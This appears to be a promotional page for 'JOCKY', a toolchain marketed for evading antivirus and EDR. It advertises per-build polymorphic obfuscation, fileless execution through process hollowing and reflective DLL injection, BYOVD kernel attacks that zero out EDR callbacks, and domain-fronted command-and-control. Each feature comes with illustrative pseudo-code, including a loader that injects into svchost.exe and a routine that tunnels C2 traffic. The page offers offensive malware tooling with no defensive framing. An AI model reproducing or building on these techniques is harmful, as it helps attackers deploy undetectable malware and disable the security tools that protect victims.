Background

The Detection Paradigm Is Broken

Modern antivirus solutions restrict proprietary software through behavioral heuristics, static signature matching, standard compiler artifacts (MSVC/GCC), typical API call sequences, and kernel-level monitoring — intercepting activities at multiple layers.

A significant paradigm shift emerges when programmers adopt sophisticated CI/CD practices. Each deployment iteration automatically passes through integrated obfuscators, encryption routines, and polymorphic engines — ensuring every instance possesses unique hashes, modified entry points, and altered import tables.

JOCKY was built to operate precisely at this frontier: leveraging a language-independent intermediate representation that alters control-flow graphs, token generation, and binary structures to render signature-based detection ineffective.

Language-Independent IR (LLVM Frontend)

JOCKY uses a custom LLVM frontend that intercepts the compilation pipeline at the intermediate representation stage — before any standard optimization passes or code generation. This allows systematic mutation of control-flow graphs and token streams.

  • Custom lexer and parser targeting JOCKY syntax → LLVM IR lowering
  • Automated CFG mutation pass: basic block reordering, opaque predicate injection
  • Token stream randomization defeats source-level pattern matching
  • Binary structure alteration renders all static signatures obsolete per build
JOCKY · IR Pass
// JOCKY IR -- CFG mutation pass example
pass cfg_mutate(module: Module) {
  for func in module.functions() {
    let blocks = func.basic_blocks();
    for bb in blocks {
      inject_opaque_pred(bb, seed: rand_u64());
      reorder_instr(bb, strategy: "phi-safe");
    }
    func.mutate_entry(entropy: env_seed());
  }
}

Polymorphic CI/CD Pipeline

Rather than manually packing a binary, JOCKY scripts pass through an automated delivery pipeline. Every iteration is unique — defeating file-reputation databases and hash-based detection without any manual intervention.

  • Per-build variable renaming, string encryption, and dead-code injection
  • Import table shuffling and export address table patching
  • Continuous hash uniqueness guaranteed across all deployment nodes
  • Integrated with standard CI runners (GitHub Actions, GitLab CI)
JOCKY · Pipeline DSL
// Polymorphic pipeline descriptor
pipeline deploy_agent {
  stage("compile"):
    jocky_build(target: "x86_64-windows")
  stage("obfuscate"):
    encrypt_strings(key: derive_key(env."BUILD_SEED"))
    rename_symbols(strategy: "markov-chain")
    inject_dead_code(blocks: 12)
  stage("validate"):
    assert_unique_hash()
    assert_no_static_sig(db: "yara-rules-latest")
}

In-Memory Execution (Fileless)

JOCKY executes secondary scripts entirely within the memory space of trusted host processes — no disk writes, no file system artifacts, no traditional AV scan surface.

  • Process Hollowing — hollows a legitimate process and injects payload into its memory space
  • Reflective DLL Injection — maps a DLL from buffer in memory without using LoadLibrary
  • API Unhooking — restores hooked NTDLL functions to original bytes at runtime
  • Direct Syscalls — bypasses usermode hooks by invoking syscall stubs directly
  • Thread Hijacking — redirects execution of an existing thread to payload entry
JOCKY · Memory Module
// Reflective loader -- JOCKY stdlib
use jocky::mem::{alloc_rwx, write_payload};
use jocky::process::{find_trusted};

fn reflective_exec(payload: &[u8]) {
  let host = find_trusted(name: "svchost.exe");
  let region = host.alloc_rwx(size: payload.len);
  write_payload(dst: region, src: payload);
  resolve_imports_peb(region);
  transfer_execution(entry: region);
}

Kernel-Level Subversion (BYOVD)

BYOVD (Bring Your Own Vulnerable Driver) techniques allow JOCKY to operate at Ring-0, disabling EDR callbacks and manipulating kernel structures to blind all security agents in the environment.

  • Automated enumeration of known-vulnerable signed drivers on target system
  • Silent driver loading via undocumented NT kernel APIs
  • EDR PatchGuard bypass and ObRegisterCallbacks removal
  • Kernel DKOM (Direct Kernel Object Manipulation) for process hiding
JOCKY · Kernel Module
// BYOVD -- EDR callback removal
use jocky::kernel::{find_vulnerable_drv, load_ring0};

fn disable_edr() {
  let drv = find_vulnerable_drv()
    .expect("No vulnerable driver found");
  let ctx = load_ring0(driver: drv);
  for cb in ctx.enumerate_callbacks() {
    if cb.is_edr_origin() {
      ctx.patch_callback(addr: cb.addr, value: 0x0);
    }
  }
}

Covert Network Transport

All command-and-control traffic between the management interface and client endpoints is routed through trusted cloud infrastructure — appearing as legitimate CDN or API traffic to all network inspection tools.

  • Domain Fronting — route through CDN hostnames to mask true C2 destination
  • Cloud API Tunneling — embed traffic within legitimate cloud service API calls
  • SOCKS5 Proxy — establish persistent tunnels over encrypted channels
  • Traffic volume and timing shaping to defeat behavioral network detection
JOCKY · Network Module
// Domain fronting transport
use jocky::net::{HttpsClient};

fn c2_connect(real_host: &str, front: &str) {
  let client = HttpsClient {
    sni:  front,      // TLS SNI: trusted CDN
    host: real_host,  // HTTP Host: real C2
    tls:  "TLS1.3",
  };
  let tunnel = client.open_socks5(
    bind: "127.0.0.1:1080",
    auth: derive_creds(env."SESSION_KEY"),
  );
  tunnel.shape_traffic(jitter_ms: 250);
}
